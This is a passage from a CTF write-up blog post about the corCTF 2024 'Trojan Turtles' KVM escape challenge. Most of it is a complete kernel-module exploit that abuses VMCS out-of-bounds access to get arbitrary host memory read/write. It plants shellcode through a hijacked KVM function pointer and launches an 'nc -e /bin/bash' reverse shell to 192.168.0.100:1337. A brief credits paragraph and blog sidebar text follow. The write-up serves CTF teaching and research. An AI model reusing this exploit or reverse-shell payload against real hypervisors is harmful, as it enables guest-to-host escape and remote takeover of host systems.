STRINGIFY_INT(VM_FUNCTION_CONTROL) "";"" ""call %[vmread];"" ""mov %[err], al;"")    :[err]""=r""(err):[offset]""r""(offset),[vmread]""r""(&vmread):""rax"",""rdi"");  if (err) {   printk(KERN_INFO ""oob read 0x%llx failure "", offset);   asm volatile (""ud2;"");  }  asm volatile(INTEL(   ""mov rax, dr2;"" ""mov %[val], rax;"")    :[val]""=r""(val)::""rax"");  return val; } static void oob_write(uint64_t offset, uint64_t val) {  uint8_t err;  asm volatile(INTEL(   ""mov rax, "" STRINGIFY_INT(BACKDOOR_TRIGGER) "";"" ""mov dr0, rax;"" ""mov rax, %[offset];"" ""mov dr1, rax;"" ""mov rax, %[val];"" ""mov dr2, rax;"" ""mov rdi, "" STRINGIFY_INT(VM_FUNCTION_CONTROL) "";"" ""call %[vmwrite];"" ""mov %[err], al;"")    :[err]""=r""(err):[offset]""r""(offset),[val]""r""(val),[vmwrite]""r""(&vmwrite):""rax"",""rdi"");  if (err) {   printk(KERN_INFO ""oob write 0x%llx (%llx) failure "", offset, val);   asm volatile (""ud2;"");  } } #define POB_TO_MODPROBE (0xffffffff913fd1f8ull - 0xffffffff9173f0c0ull) #define KBASE_TO_MODPROBE (0xffffffff8fc00000ull - 0xffffffff9173f0c0ull) #define INIT_TASK_TO_NEXT_TASK 0x478ull #define CALC_BACK_OFFSET(x) ((0x1000ull - (0x1000ull - x)) / sizeof(uint64_t)) #define CALC_FORW_OFFSET(x) (x / sizeof(uint64_t)) #define PAGE_OFF (0x1000 / sizeof(uint64_t)) #define IDXIFY(x) (x / sizeof(uint64_t)) #define XOR_ENCRYPT_KEY 0x4141414141414141ull #define HOST_MODPROBE_OFFSET 0x0c0ull static void gwipe_first_qword(void) {  *(uint64_t *)page_offset_base = 0; } static int64_t hfind_modprobe_offset(void) {  // probably backwards // null out ours first memset((uint8_t*)find_symbol(""modprobe_path""), 0, 0x10);  // hex(struct.unpack('q',b""/sbin/mo"")[0] ^ 0x4141414141414141) uint64_t xored_magic = 0x2e2c6e2f2823326e;  int64_t offset = CALC_BACK_OFFSET(HOST_MODPROBE_OFFSET);  uint64_t check = 0xf000ff53f000ff53ull ^ XOR_ENCRYPT_KEY;  int64_t check_offset = 0;  bool forward = false;  while ((oob_read(offset) ^ XOR_ENCRYPT_KEY) != xored_magic) {   offset -= PAGE_OFF;   check_offset -= PAGE_OFF;   if ((oob_read(check_offset) ^ XOR_ENCRYPT_KEY) == check) {    forward = true;    break;   }  }  if (forward) {   offset = CALC_FORW_OFFSET(HOST_MODPROBE_OFFSET);   while ((oob_read(offset) ^ XOR_ENCRYPT_KEY) != xored_magic)    offset += PAGE_OFF;  }  return offset; } static int64_t hfind_physmap_offset(void) {  uint64_t check = 0xf000ff53f000ff53ull ^ XOR_ENCRYPT_KEY;  int64_t check_offset = 0;   while ((oob_read(check_offset) ^ XOR_ENCRYPT_KEY) != check) {   check_offset -= PAGE_OFF;  }  return check_offset; } #define EGG1 0x1337beefdeadbabe // 3 objs per vcpu kmem cache, these are all the possible offsets #define ARCH_DB_3_OFFSET_0 0xb80ull #define ARCH_DB_3_OFFSET_1 0xc40ull #define ARCH_DB_3_OFFSET_2 0xd00ull static uint64_t hfind_vcpu_arch_db3(uint64_t physmap_base, uint64_t vmcs12) {  asm volatile(INTEL(   ""mov rax, "" STRINGIFY_INT(EGG1) "";"" ""mov dr3, rax;"")    :::""rax"");  uint64_t check = EGG1 ^ XOR_ENCRYPT_KEY;  int64_t offsets[] = {(physmap_base + ARCH_DB_3_OFFSET_0 - vmcs12) / 8,   (physmap_base + ARCH_DB_3_OFFSET_1 - vmcs12) / 8,   (physmap_base + ARCH_DB_3_OFFSET_2 - vmcs12) / 8};  bool found = false;  int64_t off;  while (!found) {   for (int i = 0; i < sizeof(offsets)/sizeof(int64_t); i++) {    if ((oob_read(offsets[i]) ^ XOR_ENCRYPT_KEY) == check) {     found = true;     off = offsets[i];     break;    }    offsets[i] += PAGE_OFF;    if (offsets[i] > 0 && offsets[i] < PAGE_OFF) {     if (i == 0) {      offsets[i] = CALC_FORW_OFFSET(ARCH_DB_3_OFFSET_0);     } else if (i == 1) {      offsets[i] = CALC_FORW_OFFSET(ARCH_DB_3_OFFSET_1);     } else {      offsets[i] = CALC_FORW_OFFSET(ARCH_DB_3_OFFSET_2);     }    }   }  }  return vmcs12 + (off * 8); } #define EGG2 0xdeadbeefbab31337ull static uint64_t hfind_guest_base_offset(uint64_t physmap_base, uint64_t vmcs12) {  int64_t off = (physmap_base - vmcs12) / 8;  *(uint64_t *)page_offset_base = EGG2 ^ XOR_ENCRYPT_KEY;  while ((oob_read(off) ^ XOR_ENCRYPT_KEY) != EGG2)   off += PAGE_OFF;  return off; } #define INIT_TASK_OFFSET (0xffffffffb400c980ull - 0xffffffffb2600000ull) #define NEXT_TASK_OFFSET (0xffffffffb400cdf8ull - 0xffffffffb400c980ull) #define MM_TO_NEXT_TASK_OFFSET 0x50 static uint64_t arb_read(uint64_t vmcs12, uint64_t addr) {  int64_t off = (addr - vmcs12) / 8;  return oob_read(off); } static void arb_write(uint64_t vmcs12, uint64_t addr, uint64_t val) {  int64_t off = (addr - vmcs12) / 8;  oob_write(off, val); } static void write_str(uint64_t vmcs12, uint64_t addr, char *str, int size) {  for (int i = 0; i < size; i += 8)  {   arb_write(vmcs12, addr + i, *((uint64_t *)(str + i)));  } } static __attribute__((naked)) void shellcode(void) {  asm volatile(INTEL(   ""push rdi;"" ""push rsi;"" ""push rdx;"" ""push rcx;"" ""push rbx;"" ""lea rbx, qword ptr [rip - 0x111];"" ""mov rax, qword ptr [rbx];"" // call_usermodehelper ""lea rdi, qword ptr [rbx + 0x8 * 12];"" // cmd, (12 entries) ""lea rsi, qword ptr [rbx + 0x10];"" // argv ""lea rdx, qword ptr [rbx + 0x40];"" // envp ""xor rcx, rcx;"" // UMH_NO_WAIT ""inc rcx;"" // UMH_WAIT_EXEC  ""call rax;"" ""mov rax, qword ptr [rbx + 0x8];"" // get continuation ""pop rbx;"" ""pop rcx;"" ""pop rdx;"" ""pop rsi;"" ""pop rdi;"" // ""ud2;"" ""jmp rax;""   ):::); } static void shellcode_end(void) {} void *vmxon_page; void *vmcs_page; #define CALL_USERMODEHELPER_OFFSET (0xffffffffa94a88e0ull - 0xffffffffa9400000ull) #define UPDATEWORK_TO_KVM_STRUCT_OFFSET (0xffffac2b8029e420ull - 0xffffac2b80295000ull) static int init_exploit_driver(void) {  uint64_t vmxon_phys, vmcs_phys;  register_kprobe(&kp);  find_symbol = (unsigned long (*)(const char *))kp.addr;  if (!find_symbol) {   pr_warn(""failed to find kallsyms_lookup_name "");   return -1;  }  unregister_kprobe(&kp);  if (!supports_vmx()) {   pr_warn(""system does not support vmx "");   return -1;  }  enable_vmxe();  printk(KERN_INFO ""exploit driver loaded "");  vmxon_page = (void *)get_zeroed_page(GFP_KERNEL);  vmcs_page = (void *)get_zeroed_page(GFP_KERNEL);  if (!vmxon_page || !vmcs_page) {   pr_warn(""page allocations failed "");   return -1;  }  initialize_vmxon((vmxon_region_t *)vmxon_page);  initialize_vmcs((vmcs_region_t *)vmcs_page, false);  vmxon_phys = virt_to_phys(vmxon_page);  vmcs_phys = virt_to_phys(vmcs_page);  if (vmxon(vmxon_phys)) {   pr_info(""vmxon failed "");   return -1;  }  if (vmptrld(vmcs_phys)) {   pr_info(""vmptrld failed "");   return -1;  }  gwipe_first_qword();  uint64_t modprobe_path_offset = hfind_modprobe_offset();  uint64_t page_offset_base_offset = modprobe_path_offset + IDXIFY(POB_TO_MODPROBE);  uint64_t physmap_base = oob_read(page_offset_base_offset);  uint64_t physmap_base_offset = hfind_physmap_offset();  uint64_t kbase_physmap = 8 * modprobe_path_offset + KBASE_TO_MODPROBE + physmap_base - physmap_base_offset * 8;  uint64_t curr_vmcs12 = physmap_base - physmap_base_offset * 8;  printk(KERN_INFO ""host kbase: 0x%llx "", kbase_physmap);  printk(KERN_INFO ""host physmap base: 0x%llx "", physmap_base);  printk(KERN_INFO ""current vmcs12: 0x%llx "", curr_vmcs12);  printk(KERN_INFO ""physmap base offset: 0x%llx "", physmap_base_offset);  uint64_t curr_vcpu_arch_db3 = hfind_vcpu_arch_db3(physmap_base, curr_vmcs12);  printk(KERN_INFO ""curr vcpu arch db3: 0x%llx "", curr_vcpu_arch_db3);  uint64_t curr_kvm = arb_read(curr_vmcs12, curr_vcpu_arch_db3 - 0xb80);  printk(KERN_INFO ""curr kvm: 0x%llx "", curr_kvm);  uint64_t curr_kvm_updatework_funcptr_addr = curr_kvm + UPDATEWORK_TO_KVM_STRUCT_OFFSET + 0x18;  uint64_t updatework_orig = arb_read(curr_vmcs12, curr_kvm_updatework_funcptr_addr);  printk(KERN_INFO ""kvm updatework at: 0x%llx, currently holds: 0x%llx "", curr_kvm_updatework_funcptr_addr, updatework_orig);  uint64_t physmap_init_task = kbase_physmap + INIT_TASK_OFFSET + NEXT_TASK_OFFSET;  uint64_t next_task = arb_read(curr_vmcs12, physmap_init_task);  uint64_t next_task_mm_ptr = arb_read(curr_vmcs12, next_task + 0x50);  uint64_t next_task_pml4_ptr = arb_read(curr_vmcs12, next_task_mm_ptr + 0x80);  printk(KERN_INFO ""next task pml4 ptr: 0x%llx "", next_task_pml4_ptr);  uint64_t kbase = arb_read(curr_vmcs12, next_task + 8) - (0xffffffffa480cdf8ull - 0xffffffffa2e00000ull);  printk(KERN_INFO ""kbase: 0x%llx "", kbase);  uint64_t host_guest_base = curr_vmcs12 + hfind_guest_base_offset(physmap_base, curr_vmcs12) * 8;  printk(KERN_INFO ""host guest base address: 0x%llx "", host_guest_base);  // 47 - 39 uint64_t target_pud_addr = next_task_pml4_ptr + ((physmap_base & (0b111111111ull << 39)) >> 39) * 8;  printk(KERN_INFO ""physmap start pud entry addr: 0x%llx "", target_pud_addr);  // 39 - 30 uint64_t target_pud = physmap_base + (arb_read(curr_vmcs12, target_pud_addr) & ~0xfffull);  printk(KERN_INFO ""physmap start pud entry: 0x%llx "", target_pud);  uint64_t offset = 0;  // find free entry in pud while (arb_read(curr_vmcs12, target_pud + 8 * offset) != 0) {   offset += 1;  }  uint64_t free_entry = target_pud + offset * 8;  uint64_t evil_vaddr = (physmap_base & ~0b111111111111111111111111111111111111111ull) | (offset << 30);  // can't modify existing page entries because of TLB  printk(KERN_INFO ""Filling 0x%llx with 1 GB rwx region starting from physical base 0 "", free_entry);  printk(KERN_INFO ""New evil 1 gb mapping: 0x%llx "", evil_vaddr);  arb_write(curr_vmcs12, free_entry, 0xe3);  // now begin process of writing payload // nc -e /bin/bash IP Port // HOME=/ TERM=linux PATH=/sbin:/usr/sbin:/bin:/usr/bin // 0x0 - | call_usermodehelper location | continuation function | argv (6 qwords) | envp (4 qwords) | strings char cmd[0x10] = ""/usr/bin/nc"";  char arg0[0x10] = ""/usr/bin/nc"";  char arg1[0x18] = ""192.168.0.100"";  char arg2[0x8] = ""1337"";  char arg3[0x8] = ""-e"";  char arg4[0x10] = ""/bin/bash"";  char env0[0x8] = ""HOME=/"";  char env1[0x10] = ""TERM=linux"";  char env2[0x30] = ""PATH=/sbin:/usr/sbin:/bin:/usr/bin"";  uint64_t sc_data_offset = 0;  uint64_t string_offset = 12 * 8;  arb_write(curr_vmcs12, physmap_base + sc_data_offset, kbase + CALL_USERMODEHELPER_OFFSET);  sc_data_offset += 8;  // continuation  arb_write(curr_vmcs12, physmap_base + sc_data_offset, updatework_orig);  sc_data_offset += 8;  write_str(curr_vmcs12, physmap_base + string_offset, cmd, sizeof(cmd));  string_offset += sizeof(cmd);  write_str(curr_vmcs12, physmap_base + string_offset, arg0, sizeof(arg0));  arb_write(curr_vmcs12, physmap_base + sc_data_offset, physmap_base + string_offset);  sc_data_offset += 8;  string_offset += sizeof(arg0);  write_str(curr_vmcs12, physmap_base + string_offset, arg1, sizeof(arg1));  arb_write(curr_vmcs12, physmap_base + sc_data_offset, physmap_base + string_offset);  sc_data_offset += 8;  string_offset += sizeof(arg1);  write_str(curr_vmcs12, physmap_base + string_offset, arg2, sizeof(arg2));  arb_write(curr_vmcs12, physmap_base + sc_data_offset, physmap_base + string_offset);  sc_data_offset += 8;  string_offset += sizeof(arg2);  write_str(curr_vmcs12, physmap_base + string_offset, arg3, sizeof(arg3));  arb_write(curr_vmcs12, physmap_base + sc_data_offset, physmap_base + string_offset);  sc_data_offset += 8;  string_offset += sizeof(arg3);  write_str(curr_vmcs12, physmap_base + string_offset, arg4, sizeof(arg4));  arb_write(curr_vmcs12, physmap_base + sc_data_offset, physmap_base + string_offset);  sc_data_offset += 8;  string_offset += sizeof(arg4);  arb_write(curr_vmcs12, physmap_base + sc_data_offset, 0);  sc_data_offset += 8;  write_str(curr_vmcs12, physmap_base + string_offset, env0, sizeof(env0));  arb_write(curr_vmcs12, physmap_base + sc_data_offset, physmap_base + string_offset);  sc_data_offset += 8;  string_offset += sizeof(env0);  write_str(curr_vmcs12, physmap_base + string_offset, env1, sizeof(env1));  arb_write(curr_vmcs12, physmap_base + sc_data_offset, physmap_base + string_offset);  sc_data_offset += 8;  string_offset += sizeof(env1);  write_str(curr_vmcs12, physmap_base + string_offset, env2, sizeof(env2));  arb_write(curr_vmcs12, physmap_base + sc_data_offset, physmap_base + string_offset);  sc_data_offset += 8;  string_offset += sizeof(env2);  arb_write(curr_vmcs12, physmap_base + sc_data_offset, 0);  sc_data_offset += 8;  write_str(curr_vmcs12, physmap_base + string_offset, (char *)&shellcode, (&shellcode_end - &shellcode + 7) & ~7);  uint64_t sc_addr = evil_vaddr + string_offset;  printk(KERN_INFO ""shellcode written at: 0x%llx "", sc_addr);  arb_write(curr_vmcs12, curr_kvm_updatework_funcptr_addr, sc_addr);  // https://bugs.chromium.org/p/project-zero/issues/detail?id=2177#c5 - p0 says 5 minutes  printk(KERN_INFO ""overwriting updatework... give it a few minutes to trigger :clown: "");  return 0; } static void cleanup_exploit_driver(void) {  free_page((uint64_t)vmxon_page);  free_page((uint64_t)vmcs_page);  printk(KERN_INFO ""exploit unloaded ""); } module_init(init_exploit_driver); module_exit(cleanup_exploit_driver);By the end of corCTF 2024, there were surprisingly only 2 solves for this challenge. Maybe the daunting challenge description scared people away. Congrats to Billy of Starlabs for taking first blood and zolutal of Shellphish for the second solve! He made a great writeup that I highly recommend you read - he went down a similar approach of targeting page tables, but went for the EPT entries used in VMX acceleration for guest physical to host physical address translation instead. Pumpkin from DEVCORE/Balsn also came up with a post-CTF solve immediately after the CTF ended. Hope you enjoyed reading this writeup and learned something new! Feel free to let me know if you have any questions or see any mistakes.  Posted by willsroot at 3:30 PM   Email ThisBlogThis!Share to TwitterShare to FacebookShare to Pinterest    No comments:  Post a Comment    Newer Post Older Post Home  Subscribe to: Post Comments (Atom)    Contact For further inquiries, contact me at will@willsroot.io. Feel free to use my PGP key. Publications EntryBleed: A Universal KASLR Bypass against KPTI on LinuxHASP 2023 (with MICRO)Best Paper Award Github Click here to access my Github page. Blog Archive     ▼    2024 (2)    ▼    August (2) corCTF 2024: Its Just a Dos Bug Bro - Leaking Flag... corCTF 2024 - Trojan Turtles: A KVM Escape Exploit...     ►    2023 (3)    ►    August (3)     ►    2022 (4)    ►    December (1)    ►    August (1)    ►    March (1)    ►    January (1)     ►    2021 (10)    ►    October (1)    ►    August (3)    ►    July (1)    ►    April (2)    ►    March (1)    ►    February (1)    ►    January (1)     ►    2020 (10)    ►    December (1)    ►    November (1)    ►    October (2)    ►    June (3)    ►    May (2)    ►    April (1)     ►    2019 (19)    ►    November (2)    ►    October (6)    ►    September (6)    ►    August (3)    ►    June (1)    ►    March (1)     ►    2016 (1)    ►    July (1)   Featured Post corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel In corCTF 2021, D3v17 and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and ...  Popular Posts   CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google's KCTF Containers Recently, several friends on my CTF team Crusaders of Rust and I found a Linux kernel heap overflow 0-day. We found the bug through fuzzi...   EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543) Recently, I’ve discovered that Linux KPTI has implementation issues that can allow any unprivileged local attacker to bypass KASLR on Intel...   corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel In corCTF 2021, D3v17 and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and ...  Interesting Posts   Subscribe To This Blog  Posts        Atom       Posts    Comments        Atom       Comments             Picture Window theme. Powered by Blogger.       "
